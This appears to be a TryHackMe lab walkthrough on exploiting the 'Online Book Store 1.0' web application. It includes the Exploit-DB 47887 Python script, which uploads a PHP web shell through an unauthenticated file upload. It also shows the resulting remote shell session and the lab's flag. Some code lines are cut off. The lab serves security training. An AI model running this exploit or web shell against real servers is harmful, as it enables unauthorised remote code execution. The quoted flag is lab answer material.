# Manual Exploitation

# THM Remote-Exploit Lab — Deployment & Tasks

**Note:** You must either deploy the **AttackBox** or connect to the **TryHackMe (THM) network** to complete this task.

1. Deploy the machine attached to this task. Wait **at least 5 minutes** for the machine to finish provisioning.

1. From a device on the THM network (your AttackBox or your own machine connected to THM), open a browser and visit the machine’s webserver at:
    
    `http://10.10.148.97`
    
    Answer the questions below:
    

---

### Questions

1. **What is the name and version of the application running on the webserver?**
    
    (Identify the application and its version number.)
    
    ![Bookstore_version.png](Bookstore_version.png)
    
    Answer: Online Book Store v1.0
    
2. **Find and use an exploit from the module resources** that grants remote access to the vulnerable machine.

![Exploit_DB search sploit.png](Exploit_DB_search_sploit.png)

1. Select **“Online Book Store 1.0 — Unauthenticated Remote Code Execution”** exploit

![Exploit-DB_Remote.png](Exploit-DB_Remote.png)

1. Download/import Exploit to Attackers Machine [***47887.py](http://47887.py)*** Then, in “line 18,” modify “**help=The URL of the target**” to your **target’s website or IP address**

![Edit_Exploit-DB.png](Edit_Exploit-DB.png)

```bash
# Exploit Title: Online Book Store 1.0 - Unauthenticated Remote Code Execution
# Google Dork: N/A
# Date: 2020-01-07
# Exploit Author: Tib3rius
# Vendor Homepage: https://projectworlds.in/free-projects/php-projects/online-book-store-proje>
# Software Link: https://github.com/projectworlds32/online-book-store-project-in-php/archive/m>
# Version: 1.0
# Tested on: Ubuntu 16.04
# CVE: N/A

import argparse
import random
import requests
import string
import sys

parser = argparse.ArgumentParser()
parser.add_argument('url', action='store', help='http://10.10.148.97')
args = parser.parse_args()

url = args.url.rstrip('/')
random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))

payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'

file = {'image': (random_file + '.php', payload, 'text/php')}
print('> Attempting to upload PHP web shell...')
r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
print('> Verifying shell upload...')
r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + rando>

if random_file in r.text:
    print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')
```

```bash
python 47887.py http://10.10.148.97
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.148.97/bootstrap/img/Ajm0iPP2NX.php
> Example command usage: http://10.10.148.97/bootstrap/img/Ajm0iPP2NX.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ ls
Ajm0iPP2NX.php
OyWjgNLIbq.php
android_studio.jpg
beauty_js.jpg
c_14_quick.jpg
c_sharp_6.jpg
doing_good.jpg
flag.txt
img1.jpg
img2.jpg
img3.jpg
kotlin_250x250.png
logic_program.jpg
mobile_app.jpg
pro_asp4.jpg
pro_js.jpg
unnamed.png
web_app_dev.jpg

RCE $ cat flag.txt
THM{BOOK_KEEPING}

RCE $ exit
```

- Apply the exploit against the target at `10.10.148.97`.

![RCE_exploit.png](RCE_exploit.png)

- **What is the value of the flag located in the web directory?**

![RCE_Result.png](RCE_Result.png)